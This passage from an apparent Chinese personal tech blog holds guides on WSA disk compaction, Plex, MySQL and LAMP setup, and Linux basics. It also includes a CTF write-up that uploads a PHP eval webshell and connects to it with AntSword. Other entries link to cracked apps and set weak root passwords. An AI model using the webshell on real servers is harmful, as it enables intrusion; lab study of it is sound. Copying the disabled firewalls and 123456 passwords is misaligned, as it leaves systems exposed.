aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就说明成功了。</p><ol start="3"><li>输入  <code>compact vdisk</code>  来压缩。</li></ol><pre class="line-numbers language-none"><code class="language-none">DiskPart has encountered an error: The specified file is encrypted and the user does not have the ability to decrypt it.See the System Event Log for more information.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这个就说明你没有权限压缩这个文件。<br>为了解决这个问题我百度了一晚上，最后发现，只要你把这个文件复制走，就会提示<br><img src="/img/Windowssubsystemforandroidcompression/20221118210314.png" alt=""><br>这里选择是，然后就会复制走。<br>这个时候你再看你复制的文件就会发现上面的小黄锁已经不见了。</p><ol start="4"><li>重新选择 userdata.vhdx 文件</li></ol><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">select vdisk file = "D:\userdata.vhdx"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>重新输入命令  <code>compact vdisk</code>  进行压缩，如果出现下面的提示那就说明压缩成功了。</li></ol><pre class="line-numbers language-cmd" data-language="cmd"><div class="caption"><span>cmd</span></div><code class="language-cmd">DISKPART&gt; compact vdisk  100 percent completedDiskPart successfully compacted the virtual disk file.DISKPART&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时再看你复制出来的文件，就会发现大小缩小了很多，压缩成功了。<br>接着只需要剪切拷贝出来的文件，替换掉原来的文件就可以了。</p><h1 id="成果"><a class="markdownIt-Anchor" href="#成果">#</a> 成果</h1><p><strong>压缩前：</strong></p><blockquote><p><img src="/img/Windowssubsystemforandroidcompression/20221118204548.png" alt=""></p></blockquote><p><strong>压缩后：</strong></p><blockquote><p><img src="/img/Windowssubsystemforandroidcompression/20221118210939.png" alt=""></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> wsa </tag>
            
            <tag> vhd </tag>
            
            <tag> vhdx </tag>
            
            <tag> diskpart </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机图片API</title>
      <link href="/ug/152935/"/>
      <url>/ug/152935/</url>
      
        <content type="html"><![CDATA[<h1 id="随机图片api"><a class="markdownIt-Anchor" href="#随机图片api">#</a> 随机图片 API</h1><blockquote><p>都有时效性，失效不管 233</p></blockquote><h2 id="二次元"><a class="markdownIt-Anchor" href="#二次元">#</a> 二次元</h2><p class="gallery" data-height="480"><img src="https://iw233.cn/API/Random.php" alt="" title="https://iw233.cn/API/Random.php"><br><img src="https://api.paugram.com/wallpaper" alt="" title="https://api.paugram.com/wallpaper"><br><img src="https://www.dmoe.cc/random.php" alt="" title="https://www.dmoe.cc/random.php"><br><img src="https://api.mtyqx.cn/api/random.php" alt="" title="https://api.mtyqx.cn/api/random.php"><br><img src="https://api.yimian.xyz/img?type=moe" alt="" title="https://api.yimian.xyz/img?type=moe"><br><img src="https://api.ixiaowai.cn/api/api.php" alt="" title="https://api.ixiaowai.cn/api/api.php"></p><h2 id="三次元"><a class="markdownIt-Anchor" href="#三次元">#</a> 三次元</h2><p class="gallery" data-height="480"><img src="https://api.btstu.cn/sjbz/api.php" alt="" title="https://api.btstu.cn/sjbz/api.php"><br><img src="https://api.paugram.com/bing/" alt="必应每日壁纸" title="https://api.paugram.com/bing/"><br><img src="https://api.ixiaowai.cn/gqapi/gqapi.php" alt="" title="https://api.ixiaowai.cn/gqapi/gqapi.php"></p><h2 id="menhara酱"><a class="markdownIt-Anchor" href="#menhara酱">#</a> menhara 酱</h2><p class="gallery" data-height="480"><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt="" title="https://api.ixiaowai.cn/mcapi/mcapi.php"></p><h2 id="eeedog"><a class="markdownIt-Anchor" href="#eeedog">#</a> eeedog</h2><blockquote><p>这个有点复杂建议自己去看看<br><a href="https://www.eee.dog/tech/rand-pic-api.html"> eeedog</a> 我随意放一个随机图床</p></blockquote><p class="gallery" data-height="480"><img src="https://api.yimian.xyz/img?type=imgbed" alt="" title="https://api.yimian.xyz/img?type=imgbed"></p><hr><h1 id="本地"><a class="markdownIt-Anchor" href="#本地">#</a> 本地</h1><p class="gallery"><img src="/img/pictureshow/20221116154554.png" alt="" title="女人"><br><img src="/img/pictureshow/20221116154625.png" alt="" title="女人"><br><img src="/img/pictureshow/20221116154652.png" alt=""><br><img src="/img/pictureshow/20221116154713.png" alt=""><br><img src="/img/pictureshow/20221116154721.png" alt=""><br><img src="/img/pictureshow/20221116154729.png" alt=""><br><img src="/img/pictureshow/20221116154737.png" alt=""><br><img src="/img/pictureshow/20221116154746.png" alt=""><br><img src="/img/pictureshow/20221116154914.png" alt=""><br><img src="/img/pictureshow/20221116154922.png" alt=""><br><img src="/img/pictureshow/20221116154928.png" alt=""><br><img src="/img/pictureshow/20221116154935.png" alt=""><br><img src="/img/pictureshow/20221116154945.png" alt=""><br><img src="/img/pictureshow/20221116154953.png" alt=""><br><img src="/img/pictureshow/20221116155005.png" alt=""><br><img src="/img/pictureshow/20221116155015.png" alt=""><br><img src="/img/pictureshow/20221116155023.png" alt=""><br><img src="/img/pictureshow/20221116155031.png" alt=""><br></p>]]></content>
      
      
      
        <tags>
            
            <tag> pic </tag>
            
            <tag> img </tag>
            
            <tag> api </tag>
            
            <tag> random </tag>
            
            <tag> wallpaper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在Debian系linux上通过apt的方式安装plex媒体中心</title>
      <link href="/ug/204417/"/>
      <url>/ug/204417/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><p>plex 是一个包含订阅制的个人媒体中心，可以在你的智能设备：Phone / Android TV / Windows / MAC OS 等在线使用专用的客户端来浏览你存储在 nas 上的影片。<br><img src="/img/linuxplexguide/20221102204637.png" alt=""><br>如果你付费订阅则会支持更多的功能如在线硬解码 / 使用 dashboard 来控制设备 / 使用 plexamp 来播放音乐。当然免费的功能已经足够我们使用。</p><h1 id="安装"><a class="markdownIt-Anchor" href="#安装">#</a> 安装</h1><ol><li>首先更新</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt update &amp;&amp; sudo apt upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装 apt-transport-https 包</li></ol><blockquote><p>要将 Plex 包安装到树莓派上，需要添加官方的 Plex 包仓库。这个包允许 “apt” 包管理器通过 Plex 仓库使用的 “https” 协议来检索包。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt install apt-transport-https<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>把 Plex 仓库添加到 apt 源</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">curl https://downloads.plex.tv/plex-keys/PlexSign.key | sudo apt-key add -echo deb https://downloads.plex.tv/repo/deb public main | sudo tee /etc/apt/sources.list.d/plexmediaserver.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>再次更新</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>一行命令安装 Plex</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt install plexmediaserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="使用plex"><a class="markdownIt-Anchor" href="#使用plex">#</a> 使用 Plex</h1><p>打开  <code>Your IP:32400/web</code>  来登录并配置你自己的 Plex 服务器</p><h2 id="在安卓设备上安装plex和plexamp软件"><a class="markdownIt-Anchor" href="#在安卓设备上安装plex和plexamp软件">#</a> 在安卓设备上安装 plex 和 plexamp 软件。</h2><blockquote><p>不保证时效性，若失效请自行查找。</p></blockquote><ul><li>plex 软件开心版<a href="https://apkmody.io/apps/plex">点我下载</a><br><img src="/img/linuxplexguide/image.png.png" alt=""></li><li>plexamp 软件开心版<a href="https://forum.mobilism.me/viewtopic.php?f=1332&amp;t=4970093">点我下载</a><br><img src="/img/linuxplexguide/20221102210820.png" alt=""></li><li>symfonium 这个没开心版，但是界面好看。<br><img src="/img/linuxplexguide/20221102210737.png" alt=""><br><img src="/img/linuxplexguide/20221102210803.png" alt=""></li></ul><h2 id="安装wangyiyun插件来自动匹配音乐封面和歌词"><a class="markdownIt-Anchor" href="#安装wangyiyun插件来自动匹配音乐封面和歌词">#</a> 安装 Wangyiyun 插件来自动匹配音乐封面和歌词。</h2><ol><li>使用 git clone 下载。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo git clone https://github.com/timmy0209/WangYiYun.bundle.git /usr/lib/plexmediaserver/Resources/Plug-ins-f4cdfea9c/WangYiYun.bundle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>重启 plex</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart plexmediaserver<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>直接在音乐源里勾选 wangyiyun 即可。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> media center </tag>
            
            <tag> plex </tag>
            
            <tag> emby </tag>
            
            <tag> jellyfin </tag>
            
            <tag> 视频 </tag>
            
            <tag> 音乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决mysql第一次安装后改密码的各种问题</title>
      <link href="/ug/101622/"/>
      <url>/ug/101622/</url>
      
        <content type="html"><![CDATA[<h1 id="如何重置mysql密码"><a class="markdownIt-Anchor" href="#如何重置mysql密码">#</a> 如何重置 mysql 密码？</h1><p>按照提示，alter user。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/WebBackcreat1/20221019100609.png" alt=""><br>哈哈快乐报错。</p><p>更改密码复杂度。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set global validate_password_policy=0;set global validate_password_length=1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR 1193 (HY000): Unknown system variable 'validate_password_policy'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>很快乐。</p><p>那就先查看密码规范：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SHOW VARIABLES LIKE 'validate_password%';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>提示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERROR 1820 (HY000): You must reset your password using ALTER USER statement before executing this statement.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>套娃呢是吧。</p><p>解决方法：<br>重置一个和随机密码差不多的就可以了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALTER USER 'root'@'localhost' IDENTIFIED BY 'qazWsx&gt;+&amp;3ed';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>已经提示成功了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql&gt; ALTER USER 'root'@'localhost' IDENTIFIED BY 'qazWsx&gt;+&amp;3ed';Query OK, 0 rows affected (0.02 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>更改密码复杂度：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">set global validate_password.policy=0;set global validate_password.length=6;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>修改密码并退出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ALTER USER 'root'@'localhost' IDENTIFIED BY '123456';exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就可以愉快重启登陆了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart mysqldmysql -u root -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> passwd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在centos中部署后端程序。</title>
      <link href="/ug/211932/"/>
      <url>/ug/211932/</url>
      
        <content type="html"><![CDATA[<h1 id="intro"><a class="markdownIt-Anchor" href="#intro">#</a> Intro</h1><blockquote><p>其实部署很简单，重要的地方在于部署时出现差错后该如何进行处理。</p></blockquote><h1 id="nginx的安装"><a class="markdownIt-Anchor" href="#nginx的安装">#</a> Nginx 的安装</h1><p>使用源码编译安装：</p><ol><li>访问<a href="https://nginx.org/en/download.html"> Nginx</a> 官网，复制最新版本链接。wget 到本地目录。</li></ol><blockquote><p><img src="/img/WebBackcreat1/20221016212408.png" alt=""></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https://nginx.org/download/nginx-1.23.1.tar.gz ~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>解压出来。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tar -zxvf nginx-1.23.1.tar.gz// 如果这里是 *.tar.bz2 的话则使用 -jxvf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>安装编译所需要的前置。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum -y install gcc zlib zlib-devel pcre-devel openssl openssl-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>进入解压出来的文件夹，编译安装。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd nginx-1.23.1./configuremakemake install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>nginx 的启动和关闭</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /usr/local/nginx/sbin// 启动nginx./nginx// 关闭nginx./nginx -s stop// 关闭防火墙systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>创建目录</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mkdir /var/temp/nginx -p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>建议在执行前先使用 netstat -aux | grep 80 查看是否有端口占用 80。</p></blockquote><ol start="7"><li>开机自启 * 还没写完<ol><li>编辑文件</li></ol> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cd /lib/systemd/system/vim nginx.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>添加内容</li></ol> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[Unit] Description=nginx service After=network.target [Service] Type=forking ExecStart=/usr/local/nginx/sbin/nginx ExecReload=/usr/local/nginx/sbin/nginx -s reload ExecStop=/usr/local/nginx/sbin/nginx -s quit PrivateTmp=true [Install] WantedBy=multi-user.target// 解释[Unit]:服务的说明Description:描述服务After:描述服务类别[Service]服务运行参数的设置Type=forking是后台运行的形式ExecStart为服务的具体运行命令ExecReload为重启命令ExecStop为停止命令PrivateTmp=True表示给服务分配独立的临时空间注意：[Service]的启动、重启、停止命令全部要求使用绝对路径[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>保存退出</li><li>启动</li></ol> <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start nginx.servicesystemctl enable nginx.servicesystemctl status nginx.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>233</li></ol><h1 id="编译安装-apache"><a class="markdownIt-Anchor" href="#编译安装-apache">#</a> 编译安装 apache</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum updateyum install -y gcc-c++yum install -y expat-devel pcre-develwget https://mirrors.tuna.tsinghua.edu.cn/apache/apr/apr-1.6.5.tar.gztar -zxvf apr-1.6.5.tar.gzcd apr-1.6.5./configure --prefix=/usr/local/aprmake &amp;&amp; make installwget https://dlcdn.apache.org//apr/apr-util-1.6.3.tar.gztar -zxvf apr-util-1.6.3.tar.gzcd apr-util./configure --prefix=/usr/local/apr-util --with-apr=/usr/local/apr/bin/apr-1-configmake &amp;&amp; make installwget https://nchc.dl.sourceforge.net/project/pcre/pcre/8.45/pcre-8.45.tar.gztar -zxvf pcre-8.45.tar.gzcd pcre-8.45./configure --prefix=/usr/local/pcre --with-apr=/usr/local/apr/bin/apr-1-configmake &amp;&amp; make installwget https://mirrors.aliyun.com/apache/httpd/httpd-2.4.57.tar.gztar -zxvf httpd-2.4.57.tar.gzcd httpd-2.4.57./configure --prefix=/usr/local/httpd --with-pcre=/usr/local/pcre --with-apr=/usr/local/apr --with-apr-util=/usr/local/apr-utilcp /usr/local/httpd/bin/apachectl /etc/init.d/httpdecho -e '\nexport PATH=/usr/local/apache/bin:/usr/local/apache/lib:$PATH\n' &gt;&gt; /etc/profile &amp;&amp; source /etc/profileecho "#chkconfig:2345 64 36" &gt; /etc/rc.d/init.d/httpdchkconfig --add httpdchkconfig httpd onvim /usr/local/apache/conf/httpd.confunsharp #ServerName www.example.com:80systemctl start httpdfirewall-cmd --add-port=80/tcpfirewall-cmd --add-port=443/tcp#systemctl stop firewalld#systemctl disable firewalldphpyum -y install epel-releaseyum updateyum -y install php-mcrypt libmcrypt libmcrypt-devel  autoconf  freetype gd jpegsrc libmcrypt libpng libpng-devel libjpeg libxml2 libxml2-devel zlib curl curl-devel openssl openssl-devel sqlite-develyum -y install http://down.24kplus.com/linux/oniguruma/oniguruma-6.7.0-1.el7.x86_64.rpmyum -y install http://down.24kplus.com/linux/oniguruma/oniguruma-devel-6.7.0-1.el7.x86_64.rpmwget https://www.php.net/distributions/php-8.2.5.tar.gztar -zxvf php-8.2.5.tar.gzcd php-8.2.5./configure --prefix=/usr/local/php8/ --with-config-file-path=/usr/local/php8/etc/ --with-apxs2=/usr/local/httpd/bin/apxs --enable-mbstring --with-curl -with-gd --enable-fpm --enable-mysqlnd --with-pdo-mysql=mysqlnd --with-mysqli=mysqlndmake &amp;&amp; make installecho -e  '\nexport PATH=/usr/local/php8/bin:/usr/local/php8/sbin:$PATH\n' &gt;&gt; /etc/profile &amp;&amp; source /etc/profilephp-fpm -t出现如下提示则正常：[18-Apr-2023 10:12:57] NOTICE: configuration file /usr/local/php8/etc/php-fpm.conf test is successful使用如下命令启动php/etc/init.d/php-fpm关闭pkill php-fpmvi /usr/local/httpd/conf/httpd.conf1、查看是否已经添加了，如果没有在loadModule处添加 ，正确安装后，应该已经有了LoadModule php7_module modules/libphp7.so 2、 在&lt;IfModule dir_module&gt;模块添加index.php&lt;IfModule dir_module&gt;    DirectoryIndex index.html index.php&lt;/IfModule&gt; 3、找到：AddType  application/x-compress .ZAddType application/x-gzip .gz .tgz添加如下内容AddType application/x-httpd-php-source .phpsAddType application/x-httpd-php .phpsystemctl restart httpdcd /usr/local/httpd/htdocs/echo "&lt;?php phpinfo(); ?&gt;" &gt; index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="mysql-的安装"><a class="markdownIt-Anchor" href="#mysql-的安装">#</a> Mysql 的安装</h1><ol><li>先安装 wget  <code>yum install wget</code> 。</li><li>下载并安装 mysql。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https://dev.mysql.com/get/mysql80-community-release-el7-7.noarch.rpmyum -y localinstall mysql80-community-release-el7-7.noarch.rpmyum -y install mysql-community-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>启动 mysql</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// 启动mysqlsystemctl start mysqld// 写入开机启动systemctl enable mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li>查找日志并找到临时密码。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">vi /var/log/mysqld.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><img src="/img/WebBackcreat1/20221019082932.png" alt=""></p></blockquote><ol><li>登录 mysql</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql -u root -p// 密码则为查找到的临时密码。password:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>修改密码</li></ol><blockquote><p>后面专门说这傻逼 mysql 改密码。</p></blockquote><ol><li>重启 mysql 服务</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">service mysqld restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>重启后就可以正常使用 mysql 了。</p></blockquote><h1 id="httpdphp安装"><a class="markdownIt-Anchor" href="#httpdphp安装">#</a> httpd/php 安装</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo yum update &amp;&amp; sudo yum upgradesystemctl status httpdsudo yum install httpdsystemctl start httpdservice mysql startyum install php php-develcd /var/www/html/vi test.php------&lt;?php phpinfo();?&gt;------systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开浏览器访问<br> localhost/test.php<br> 出现 php 信息就成功了。</p><h1 id="安装pma"><a class="markdownIt-Anchor" href="#安装pma">#</a> 安装 pma</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https://files.phpmyadmin.net/phpMyAdmin/5.2.1/phpMyAdmin-5.2.1-all-languages.zipunzip phpMyAdmin-5.2.1-all-languages.zipmv phpMyAdmin-5.2.1-all-languages pmayum install php-mysqlicd pmacp config.sample.inc.php config.inc.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开浏览器访问<br> localhost/pma<br> 提示登陆就成功了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> centos </tag>
            
            <tag> web </tag>
            
            <tag> nginx </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF：Upload-Labs-Linux</title>
      <link href="/ug/085248/"/>
      <url>/ug/085248/</url>
      
        <content type="html"><![CDATA[<h1 id="题目预览"><a class="markdownIt-Anchor" href="#题目预览">#</a> 题目预览：</h1><p><img src="/img/Upload-Labs-Linux/20221010085420.png" alt=""></p><h1 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h1><ol><li>开控制台</li><li>关闭 javascript<blockquote><p>设置 - 偏好设置 - 调试程序<br>删除 <code>onsubmit="return.checkFile()"</code></p></blockquote></li><li>新建一个文件里面写入 <code>&lt;?php @eval($_POST['123']);?&gt;</code></li><li>后缀名改为 php 上传到网站，显示出图片后右键复制链接。</li><li>打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.</li><li>点击链接就能发现根目录有个 flag 文件了。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> buuctf </tag>
            
            <tag> antsword </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linuxlearn2</title>
      <link href="/ug/082833/"/>
      <url>/ug/082833/</url>
      
        <content type="html"><![CDATA[<hr><p>title: linuxlearn2<br>date: 2022-10-18 11:16:47<br>tags:</p><ul><li>diff</li><li>sudoers</li><li>passwd</li><li>usermod</li><li>linux</li></ul><hr><ul><li>diff 命令<br> diff 参数 文件 1 文件 2 &gt; 新文件</li></ul><p>netstat -ano | grep “80”</p><ul><li><p>sudoers<br>% 开头表示用户组<br>权限:<br>/sbin:<br> 该目录下的命令通常只有管理员才可以运行<br> /bin：<br>下的命令管理员和一般的用户都可以使用。<br>/usr/sbin：<br>这个目录表示系统命令的位置<br> /usr/bin:<br> 存放一些用户命令，如 led (控制 LED 灯的)。</p></li><li><p>passwd<br> 创建用户权限<br> /etc/passwd<br> 用户名：口令：用户标识号：组标识号：注释性描述：主目录：登录 Shell<br>useradd -u uid</p></li><li><p>usermod &amp; groupmod<br>// 修改用户所属组<br> usermod -g 用户组 用户名<br> // 修改用户 ID<br>usermod -u UID 用户名<br> // 修改组 ID<br>usermod -g GID 组名</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux入门学习0</title>
      <link href="/ug/175233/"/>
      <url>/ug/175233/</url>
      
        <content type="html"><![CDATA[<h1 id="linux系统目录结构"><a class="markdownIt-Anchor" href="#linux系统目录结构">#</a> linux 系统目录结构</h1><blockquote><p>在 linux 中，所有都是以文件的形式存储和管理的。</p></blockquote><h2 id="bin"><a class="markdownIt-Anchor" href="#bin">#</a> /bin</h2><blockquote><p>Binary 存放经常使用的命令。</p></blockquote><h2 id="sbin"><a class="markdownIt-Anchor" href="#sbin">#</a> /sbin</h2><blockquote><p>super Binary 超级用户命令存放的目录。</p></blockquote><h2 id="home"><a class="markdownIt-Anchor" href="#home">#</a> /home</h2><blockquote><p>用户目录</p></blockquote><h2 id="root"><a class="markdownIt-Anchor" href="#root">#</a> /root</h2><blockquote><p>系统管理员目录</p></blockquote><h2 id="etc"><a class="markdownIt-Anchor" href="#etc">#</a> /etc</h2><blockquote><p>管理系统配置文件</p></blockquote><h2 id="usr"><a class="markdownIt-Anchor" href="#usr">#</a> /usr</h2><blockquote><p>类似于 windows 下 Programfiles 目录，</p></blockquote><h2 id="boot"><a class="markdownIt-Anchor" href="#boot">#</a> /boot</h2><blockquote><p>启动所使用的核心文件都会存放在这里。</p></blockquote><h2 id="proc"><a class="markdownIt-Anchor" href="#proc">#</a> /proc</h2><blockquote><p>内存映射</p></blockquote><h2 id="srv"><a class="markdownIt-Anchor" href="#srv">#</a> /srv</h2><blockquote><p>services 的缩写，用于存放服务启动所需要的数据</p></blockquote><h2 id="sys"><a class="markdownIt-Anchor" href="#sys">#</a> /sys</h2><blockquote><p>系统文件</p></blockquote><h2 id="tmp"><a class="markdownIt-Anchor" href="#tmp">#</a> /tmp</h2><blockquote><p>是 temporary (临时) 的缩写，存放临时 / 缓存文件，可当作回收站使用。</p></blockquote><h2 id="dev"><a class="markdownIt-Anchor" href="#dev">#</a> /dev</h2><blockquote><p>device 的缩写，类似于 windows 的设备管理器。</p></blockquote><h2 id="mnt"><a class="markdownIt-Anchor" href="#mnt">#</a> /mnt</h2><blockquote><p>linux 用于挂载可移动设备（临时）的目录。</p></blockquote><h2 id="opt"><a class="markdownIt-Anchor" href="#opt">#</a> /opt</h2><blockquote><p>主机额外安装的软件存放的目录</p></blockquote><h2 id="var"><a class="markdownIt-Anchor" href="#var">#</a> /var</h2><blockquote><p>存放经常被修改的目录或文件，比如日志（*.log）。</p></blockquote><h2 id="lib"><a class="markdownIt-Anchor" href="#lib">#</a> /lib</h2><blockquote><p>存放系统基本的动态链接库。</p></blockquote><h1 id="权限数字意思详解"><a class="markdownIt-Anchor" href="#权限数字意思详解">#</a> 权限数字意思详解</h1><p>我们首先打开控制台在任意位置输入 ll, 就能看到当前文件夹下所有类型的信息。我们只取其中的前十位来进行结束.</p><blockquote><p>dr-xr-xr-x.</p></blockquote><h2 id="第一位"><a class="markdownIt-Anchor" href="#第一位">#</a> 第一位</h2><blockquote><p>第一位表示类型</p></blockquote><ul><li>d directory 表示目录</li><li>b block 块文件</li><li>c char 字符文件</li><li>- file 普通文件</li><li>l link 链接</li><li>etc.</li></ul><h2 id="后面九位"><a class="markdownIt-Anchor" href="#后面九位">#</a> 后面九位</h2><blockquote><p>后面九位表示了文件的类型，对应的位置如果是 <code>-</code>  则表示没有对应的权限.</p></blockquote><table>    <tbody><tr><th>        </th><td colspan="3">前三位</td>        <td colspan="3">中间三位</td>        <td colspan="3">后三位</td>        </tr><tr align="center">        <td colspan="3">创建者</td>        <td colspan="3">同组用户</td>        <td colspan="3">其他用户</td>    </tr>    <tr align="center">        <td>r</td>        <td>w</td>        <td>x</td>        <td>r</td>        <td>w</td>        <td>x</td>        <td>r</td>        <td>w</td>        <td>x</td>    </tr>    <tr align="center">        <td>读</td>        <td>写</td>        <td>执行</td>        <td>读</td>        <td>写</td>        <td>执行</td>        <td>读</td>        <td>写</td>        <td>执行</td>    </tr></tbody></table><p>下面来看一个实例:</p><p>如果一个文件的权限为 755, 则代表什么意思？</p><p>我们只需要把 755 按位转换为二进制，对应位为 0 则表示没有这个权限.</p><table><thead><tr><th>7</th><th>5</th><th>5</th></tr></thead><tbody><tr><td>111</td><td>101</td><td>101</td></tr></tbody></table><p>用人的语言表述:</p><blockquote><p>对于创建者：可以读取，可以更改，可以执行.<br> 